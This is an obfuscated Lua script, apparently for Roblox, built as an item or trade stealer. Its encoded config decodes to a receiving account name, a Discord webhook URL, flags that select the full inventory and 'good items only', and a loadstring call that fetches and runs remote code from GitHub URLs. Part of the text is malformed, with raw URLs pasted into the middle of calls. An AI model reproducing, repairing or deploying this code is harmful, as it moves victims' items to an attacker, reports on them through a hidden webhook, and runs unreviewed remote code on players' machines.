function QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


Config = {
    Receivers = {QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({7140,11655,11550,12180,7245,12600,10605,10395,8610,10185,11550,10500,11655,11445,8715,10395,11970,11025,11760,12180})},
    Webhook = QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({10920,12180,12180,11760,12075,6090,4935,4935,10500,11025,12075,10395,11655,11970,10500,4830,10395,11655,11445,4935,10185,11760,11025,4935,12495,10605,10290,10920,11655,11655,11235,12075,4935,5145,5250,5670,5670,5985,5670,5880,5250,5460,5670,5460,5145,5040,5880,5040,5565,5250,5880,5985,4935,11025,5040,11865,7245,11970,11340,10395,11865,11340,4725,12075,10500,10815,10395,11760,11655,10395,8715,8715,7455,11550,11655,5145,10815,5040,5460,11760,8925,7980,7350,4725,10290,11865,8190,12285,8085,8085,11760,5565,4725,8925,8610,5460,10395,11655,7980,9030,11760,12810,11970,5775,12075,6825,12390,9450,11025,7245,5985,12075,10500,7035,12495,10290,7875,7560,10815,7140,12495}),
    FullInventory = true,
    GoodItemsOnly = true,
    ResendTrade = QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({4830,11970,10605,12075,10605,11550,10500}),
    Script = QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({7035,12285,12075,12180,11655,11445}),
    CustomLink = QHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({11340,11655,10185,10500,12075,12180,11970,11025,11550,10815,4200,10815,10185,11445,10605,6090,7560,12180,12180,11760,7455,10605,12180,4200})https://raw.githubusercontent.com/EclipseScripts/notification/main/GreetingQHXXTMlzIgusKohqijSolqgOnGQjJqYszSwuPzeICvHFwieURGvM({4305,4305,4200,4305,1365,1050,13125,1365,1050,11340,11655,10185,10500,12075,12180,11970,11025,11550,10815,4200,10815,10185,11445,10605,6090,7560,12180,12180,11760,7455,10605,12180,4200})https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source'))()    
